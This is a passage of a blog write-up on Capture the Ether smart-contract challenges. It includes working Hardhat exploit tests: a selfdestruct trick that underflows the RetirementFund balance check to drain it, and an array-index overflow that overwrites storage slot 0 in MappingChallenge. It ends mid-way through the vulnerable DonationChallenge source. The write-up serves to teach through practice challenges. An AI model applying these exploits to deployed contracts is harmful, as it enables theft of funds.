</span></span><span class="line" line="14"><span style="--shiki-default:#F97583">        selfdestruct</span><span style="--shiki-default:#E1E4E8">(target);
</span></span><span class="line" line="15"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="16"><span style="--shiki-default:#E1E4E8">}
</span></span></code><!--]--></pre></div></div><p><!--[-->We apply a basic protection to make sure that we&#39;re the only ones who can call the <code class=""><!--[-->die<!--]--></code> method, but other than that it&#39;s a very simple contract. We then call this in our test and send 1 wei, causing <code class=""><!--[-->startBalance - address(this).balance<!--]--></code> to underflow to <code class=""><!--[-->(2**256)-1<!--]--></code> - significantly &gt; 0.<!--]--></p><div language="typescript" meta style=""><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate">test/math/retirement-fund-challenge.ts</div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="language-typescript shiki shiki-themes github-dark my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code><span class="line" line="1"><span style="--shiki-default:#F97583">import</span><span style="--shiki-default:#E1E4E8"> { expect } </span><span style="--shiki-default:#F97583">from</span><span style="--shiki-default:#9ECBFF"> &quot;chai&quot;</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="2"><span style="--shiki-default:#F97583">import</span><span style="--shiki-default:#E1E4E8"> { ethers } </span><span style="--shiki-default:#F97583">from</span><span style="--shiki-default:#9ECBFF"> &quot;hardhat&quot;</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="3"><span emptylineplaceholder="true">
</span></span><span class="line" line="4"><span style="--shiki-default:#F97583">import</span><span style="--shiki-default:#E1E4E8"> { expect } </span><span style="--shiki-default:#F97583">from</span><span style="--shiki-default:#9ECBFF"> &quot;chai&quot;</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="5"><span style="--shiki-default:#F97583">import</span><span style="--shiki-default:#E1E4E8"> { ethers } </span><span style="--shiki-default:#F97583">from</span><span style="--shiki-default:#9ECBFF"> &quot;hardhat&quot;</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="6"><span emptylineplaceholder="true">
</span></span><span class="line" line="7"><span style="--shiki-default:#B392F0">describe</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;RetirementFundChallenge&quot;</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#F97583">function</span><span style="--shiki-default:#E1E4E8"> () {
</span></span><span class="line" line="8"><span style="--shiki-default:#B392F0">  it</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;should return true if we empty the retirement fund&quot;</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#F97583">async</span><span style="--shiki-default:#F97583"> function</span><span style="--shiki-default:#E1E4E8"> () {
</span></span><span class="line" line="9"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#E1E4E8"> [, </span><span style="--shiki-default:#79B8FF">player</span><span style="--shiki-default:#E1E4E8">] </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> ethers.</span><span style="--shiki-default:#B392F0">getSigners</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="10"><span emptylineplaceholder="true">
</span></span><span class="line" line="11"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> Challenge</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> ethers.</span><span style="--shiki-default:#B392F0">getContractFactory</span><span style="--shiki-default:#E1E4E8">(
</span></span><span class="line" line="12"><span style="--shiki-default:#9ECBFF">      &quot;RetirementFundChallenge&quot;
</span></span><span class="line" line="13"><span style="--shiki-default:#E1E4E8">    );
</span></span><span class="line" line="14"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> challenge</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> Challenge.</span><span style="--shiki-default:#B392F0">deploy</span><span style="--shiki-default:#E1E4E8">(player.address, {
</span></span><span class="line" line="15"><span style="--shiki-default:#E1E4E8">      value: ethers.utils.</span><span style="--shiki-default:#B392F0">parseEther</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;1&quot;</span><span style="--shiki-default:#E1E4E8">),
</span></span><span class="line" line="16"><span style="--shiki-default:#E1E4E8">    });
</span></span><span class="line" line="17"><span style="--shiki-default:#F97583">    await</span><span style="--shiki-default:#E1E4E8"> challenge.</span><span style="--shiki-default:#B392F0">deployed</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="18"><span emptylineplaceholder="true">
</span></span><span class="line" line="19"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> Solver</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> ethers.</span><span style="--shiki-default:#B392F0">getContractFactory</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;RetirementFundSolver&quot;</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="20"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> solver</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> Solver.</span><span style="--shiki-default:#B392F0">deploy</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="21"><span style="--shiki-default:#F97583">    await</span><span style="--shiki-default:#E1E4E8"> solver.</span><span style="--shiki-default:#B392F0">deployed</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="22"><span emptylineplaceholder="true">
</span></span><span class="line" line="23"><span style="--shiki-default:#F97583">    await</span><span style="--shiki-default:#E1E4E8"> solver.</span><span style="--shiki-default:#B392F0">die</span><span style="--shiki-default:#E1E4E8">(challenge.address, {
</span></span><span class="line" line="24"><span style="--shiki-default:#E1E4E8">      value: </span><span style="--shiki-default:#79B8FF">1</span><span style="--shiki-default:#E1E4E8">,
</span></span><span class="line" line="25"><span style="--shiki-default:#E1E4E8">    });
</span></span><span class="line" line="26"><span emptylineplaceholder="true">
</span></span><span class="line" line="27"><span style="--shiki-default:#F97583">    await</span><span style="--shiki-default:#E1E4E8"> challenge.</span><span style="--shiki-default:#B392F0">connect</span><span style="--shiki-default:#E1E4E8">(player).</span><span style="--shiki-default:#B392F0">collectPenalty</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="28"><span emptylineplaceholder="true">
</span></span><span class="line" line="29"><span style="--shiki-default:#B392F0">    expect</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#F97583">await</span><span style="--shiki-default:#E1E4E8"> challenge.</span><span style="--shiki-default:#B392F0">isComplete</span><span style="--shiki-default:#E1E4E8">()).to.</span><span style="--shiki-default:#B392F0">equal</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">true</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="30"><span style="--shiki-default:#E1E4E8">  });
</span></span><span class="line" line="31"><span style="--shiki-default:#E1E4E8">});
</span></span></code><!--]--></pre></div></div><p><!--[-->A quick run shows that the test passes - we&#39;ve cleared out the fund!<!--]--></p><h3 id="mappingchallenge"><a href="#mappingchallenge"><!--[-->MappingChallenge<!--]--></a></h3><p><!--[-->This challenge shows us how important it is to understand exactly how the EVM stores data. We&#39;ve covered overwriting storage addresses previously, but here we look in some depth at how arrays are stored, and how that can be abused if proper care isn&#39;t taken to sanitise user input. This contract has just 2 storage variables - isComplete, and a uint256 array.<!--]--></p><div language="solidity" meta style=""><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate">contracts/math/MappingChallenge.sol</div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="language-solidity shiki shiki-themes github-dark my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code><span class="line" line="1"><span style="--shiki-default:#F97583">pragma</span><span style="--shiki-default:#85E89D"> solidity</span><span style="--shiki-default:#79B8FF"> ^0.4.21</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="2"><span emptylineplaceholder="true">
</span></span><span class="line" line="3"><span style="--shiki-default:#F97583">contract</span><span style="--shiki-default:#B392F0"> MappingChallenge</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="4"><span style="--shiki-default:#79B8FF">    bool</span><span style="--shiki-default:#F97583"> public</span><span style="--shiki-default:#E1E4E8"> isComplete;
</span></span><span class="line" line="5"><span style="--shiki-default:#79B8FF">    uint256</span><span style="--shiki-default:#E1E4E8">[] map;
</span></span><span class="line" line="6"><span emptylineplaceholder="true">
</span></span><span class="line" line="7"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> set</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">uint256</span><span style="--shiki-default:#FFAB70"> key</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#79B8FF">uint256</span><span style="--shiki-default:#FFAB70"> value</span><span style="--shiki-default:#E1E4E8">) </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="8"><span style="--shiki-default:#6A737D">        // Expand dynamic array as needed
</span></span><span class="line" line="9"><span style="--shiki-default:#F97583">        if</span><span style="--shiki-default:#E1E4E8"> (map.length </span><span style="--shiki-default:#F97583">&lt;=</span><span style="--shiki-default:#E1E4E8"> key) {
</span></span><span class="line" line="10"><span style="--shiki-default:#E1E4E8">            map.length </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#E1E4E8"> key </span><span style="--shiki-default:#F97583">+</span><span style="--shiki-default:#79B8FF"> 1</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="11"><span style="--shiki-default:#E1E4E8">        }
</span></span><span class="line" line="12"><span emptylineplaceholder="true">
</span></span><span class="line" line="13"><span style="--shiki-default:#E1E4E8">        map[key] </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#E1E4E8"> value;
</span></span><span class="line" line="14"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="15"><span emptylineplaceholder="true">
</span></span><span class="line" line="16"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> get</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">uint256</span><span style="--shiki-default:#FFAB70"> key</span><span style="--shiki-default:#E1E4E8">) </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#F97583"> view</span><span style="--shiki-default:#F97583"> returns</span><span style="--shiki-default:#E1E4E8"> (</span><span style="--shiki-default:#79B8FF">uint256</span><span style="--shiki-default:#E1E4E8">) {
</span></span><span class="line" line="17"><span style="--shiki-default:#F97583">        return</span><span style="--shiki-default:#E1E4E8"> map[key];
</span></span><span class="line" line="18"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="19"><span style="--shiki-default:#E1E4E8">}
</span></span></code><!--]--></pre></div></div><p><!--[-->Now, as we&#39;ve discussed before, EVM storage is basically just a gigantic map of uint256 keys to uint256 values... Which is exactly what this contract has implemented! Sounds like it&#39;s ripe for overwriting <code class=""><!--[-->isComplete<!--]--></code> with a value of our choice, as there will be a place at which these two overlap. What we need to do is figure out where exactly the overlap will occur, and then we should just be able to set the value by passing the correct index as the <code class=""><!--[-->set<!--]--></code> method&#39;s <code class=""><!--[-->key<!--]--></code> parameter and <code class=""><!--[-->1<!--]--></code> as the value.<!--]--></p><p><!--[-->When a dynamically sized array is defined as a storage variable, this only actually <a href="https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html#mappings-and-dynamic-arrays" rel="nofollow"><!--[-->stores the length of the array in the storage variable<!--]--></a>. The contents of the array is stored in sequential addresses, starting at <code class=""><!--[-->keccak256(slot)<!--]--></code>. Our <code class=""><!--[-->uint256[] map<!--]--></code> is stored in slot 1, so we can calculate the key at which the array overlaps back to overwrite slot 0 by calculating <code class=""><!--[-->(2**256)-keccak256(0x1)<!--]--></code>. Our test for this looks as follows:<!--]--></p><div language="typescript" meta style=""><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate">test/math/mapping-challenge.ts</div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="language-typescript shiki shiki-themes github-dark my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code><span class="line" line="1"><span style="--shiki-default:#F97583">import</span><span style="--shiki-default:#E1E4E8"> { expect } </span><span style="--shiki-default:#F97583">from</span><span style="--shiki-default:#9ECBFF"> &quot;chai&quot;</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="2"><span style="--shiki-default:#F97583">import</span><span style="--shiki-default:#E1E4E8"> { ethers } </span><span style="--shiki-default:#F97583">from</span><span style="--shiki-default:#9ECBFF"> &quot;hardhat&quot;</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="3"><span emptylineplaceholder="true">
</span></span><span class="line" line="4"><span style="--shiki-default:#B392F0">describe</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;MappingChallenge&quot;</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#F97583">function</span><span style="--shiki-default:#E1E4E8"> () {
</span></span><span class="line" line="5"><span style="--shiki-default:#B392F0">  it</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;should return true if we force the value of isComplete to be 1&quot;</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#F97583">async</span><span style="--shiki-default:#F97583"> function</span><span style="--shiki-default:#E1E4E8"> () {
</span></span><span class="line" line="6"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> Challenge</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> ethers.</span><span style="--shiki-default:#B392F0">getContractFactory</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;MappingChallenge&quot;</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="7"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> challenge</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> Challenge.</span><span style="--shiki-default:#B392F0">deploy</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="8"><span style="--shiki-default:#F97583">    await</span><span style="--shiki-default:#E1E4E8"> challenge.</span><span style="--shiki-default:#B392F0">deployed</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="9"><span emptylineplaceholder="true">
</span></span><span class="line" line="10"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> slot</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#E1E4E8"> ethers.utils.</span><span style="--shiki-default:#B392F0">hexZeroPad</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;0x1&quot;</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#79B8FF">32</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="11"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> arrayLoc</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#E1E4E8"> ethers.utils.</span><span style="--shiki-default:#B392F0">keccak256</span><span style="--shiki-default:#E1E4E8">(slot);
</span></span><span class="line" line="12"><span emptylineplaceholder="true">
</span></span><span class="line" line="13"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> overflowLoc</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#E1E4E8"> ethers.constants.MaxUint256.</span><span style="--shiki-default:#B392F0">sub</span><span style="--shiki-default:#E1E4E8">(arrayLoc).</span><span style="--shiki-default:#B392F0">add</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">1</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="14"><span emptylineplaceholder="true">
</span></span><span class="line" line="15"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> setTx</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> challenge.</span><span style="--shiki-default:#B392F0">set</span><span style="--shiki-default:#E1E4E8">(overflowLoc, </span><span style="--shiki-default:#79B8FF">1</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="16"><span style="--shiki-default:#F97583">    await</span><span style="--shiki-default:#E1E4E8"> setTx.</span><span style="--shiki-default:#B392F0">wait</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="17"><span emptylineplaceholder="true">
</span></span><span class="line" line="18"><span style="--shiki-default:#B392F0">    expect</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#F97583">await</span><span style="--shiki-default:#E1E4E8"> challenge.</span><span style="--shiki-default:#B392F0">isComplete</span><span style="--shiki-default:#E1E4E8">()).to.</span><span style="--shiki-default:#B392F0">equal</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">true</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="19"><span style="--shiki-default:#E1E4E8">  });
</span></span><span class="line" line="20"><span style="--shiki-default:#E1E4E8">});
</span></span></code><!--]--></pre></div></div><p><!--[-->Nice and simple - we&#39;ve used some useful helpers from <a href="https://docs.ethers.io/v5/api/utils" rel="nofollow"><!--[-->ethers.js<!--]--></a> to simplify the calculations. Running this shows that it passes! On to the next challenge.<!--]--></p><h3 id="donationchallenge"><a href="#donationchallenge"><!--[-->DonationChallenge<!--]--></a></h3><p><!--[-->This challenge contains some frankly bizarre mistakes. The docs don&#39;t match the logic, to the point where the contract wouldn&#39;t even have worked for a simple usability test. However it also does teach us something useful and not very intuitive about instantiating structs.<!--]--></p><div language="solidity" meta style=""><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate">contracts/math/DonationChallenge.sol</div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="language-solidity shiki shiki-themes github-dark my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code><span class="line" line="1"><span style="--shiki-default:#F97583">pragma</span><span style="--shiki-default:#85E89D"> solidity</span><span style="--shiki-default:#79B8FF"> ^0.4.21</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="2"><span emptylineplaceholder="true">
</span></span><span class="line" line="3"><span style="--shiki-default:#F97583">contract</span><span style="--shiki-default:#B392F0"> DonationChallenge</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="4"><span style="--shiki-default:#F97583">    struct</span><span style="--shiki-default:#B392F0"> Donation</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="5"><span style="--shiki-default:#79B8FF">        uint256</span><span style="--shiki-default:#E1E4E8"> timestamp;
</span></span><span class="line" line="6"><span style="--shiki-default:#79B8FF">        uint256</span><span style="--shiki-default:#E1E4E8"> etherAmount;
</span></span><span class="line" line="7"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="8"><span style="--shiki-default:#E1E4E8">    Donation[] </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#E1E4E8"> donations;
</span></span><span class="line" line="9"><span emptylineplaceholder="true">
</span></span><span class="line" line="10"><span style="--shiki-default:#79B8FF">    address</span><span style="--shiki-default:#F97583"> public</span><span style="--shiki-default:#E1E4E8"> owner;
</span></span><span class="line" line="11"><span emptylineplaceholder="true">
</span></span><span class="line" line="12"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> DonationChallenge</span><span style="--shiki-default:#E1E4E8">() </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#F97583"> payable</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="13"><span style="--shiki-default:#F97583">        require</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">msg</span><span style="--shiki-default:#E1E4E8">.value </span><span style="--shiki-default:#F97583">==</span><span style="--shiki-default:#79B8FF"> 1</span><span style="--shiki-default:#79B8FF"> ether</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="14"><span emptylineplaceholder="true">
</span></span><span class="line" line="15"><span style="--shiki-default:#E1E4E8">        owner </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#79B8FF"> msg.sender</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="16"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="17"><span emptylineplaceholder="true">
</span></span><span class="line" line="18"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> isComplete</span><span style="--shiki-default:#E1E4E8">() </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#F97583"> view</span><span style="--shiki-default:#F97583"> returns</span><span style="--shiki-default:#E1E4E8"> (</span><span style="--shiki-default:#79B8FF">bool</span><span style="--shiki-default:#E1E4E8">) {
</span></span><span class="line" line="19"><span style="--shiki-default:#F97583">        return</span><span style="--shiki-default:#79B8FF"> address</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">this</span><span style="--shiki-default:#E1E4E8">).balance </span><span style="--shiki-default:#F97583">==</span><span style="--shiki-default:#79B8FF"> 0</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="20"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="21"><span emptylineplaceholder="true">
</span></span><span class="line" line="22"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> donate</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">uint256</span><span style="--shiki-default:#FFAB70"> etherAmount</span><span style="--shiki-default:#E1E4E8">) </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#F97583"> payable</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="23"><span style="--shiki-default:#6A737D">        // amount is in ether, but msg.value is in wei
</span></span><span class="line" line="24"><span style="--shiki-default:#79B8FF">        uint256</span><span style="--shiki-default:#E1E4E8"> scale </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#79B8FF"> 10</span><span style="--shiki-default:#F97583">**</span><span style="--shiki-default:#79B8FF">18</span><span style="--shiki-default:#F97583"> *</span><span style="--shiki-default:#79B8FF"> 1</span><span style="--shiki-default:#79B8FF"> ether</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="25"><span style="--shiki-default:#F97583">        require</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">msg</span><span style="--shiki-default:#E1E4E8">.value </span><span style="--shiki-default:#F97583">==</span><span style="--shiki-default:#E1E4E8"> etherAmount </span><span style="--shiki-default:#F97583">/</span><span style="--shiki-default:#E1E4E8"> scale);
</span></span><span class="line" line="26"><span emptylineplaceholder="true">
</span></span><span class="line" line="27"><span style="--shiki-default:#E1E4E8">        Donation donation;
</span></span><span class="line" line="28"><span style="--shiki-default:#E1E4E8">        donation.timestamp </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#79B8FF"> now</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="29"><span style="--shiki-default:#E1E4E8">        donation.etherAmount </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#E1E4E8"> etherAmount;
</span></span><span class="line" line="30"><span emptylineplaceholder="true">
</span></span><span class="line" line="31"><span style="--shiki-default:#E1E4E8">        donations.</span><span style="--shiki-default:#B392F0">push</span><span style="--shiki-default:#E1E4E8">(donation);
</span></span><span class="line" line="32"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="33"><span emptylineplaceholder="true">
</span></span><span class="line" line="34"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> withdraw</span><span style="--shiki-default:#E1E4E8">() </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="35"><span style="--shiki-default:#F97583">        require</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">msg.sender</span><span style="--shiki-default:#F97583"> ==</span><span style="--shiki-default:#E1E4E8"> owner);
</span></span><span class="line" line="36"><span emptylineplaceholder="true">
</span></span><span class="line" line="37"><span style="--shiki-default:#79B8FF">        msg.sender</span><span style="--shiki-default:#E1E4E8">.</span><span style="--shiki-default:#B392F0">transfer</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">this</span><span style="--shiki-default:#E1E4E8">).balance);
</span></span><span class="line" line="38"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="39"><span style="--shiki-default:#E1E4E8">}
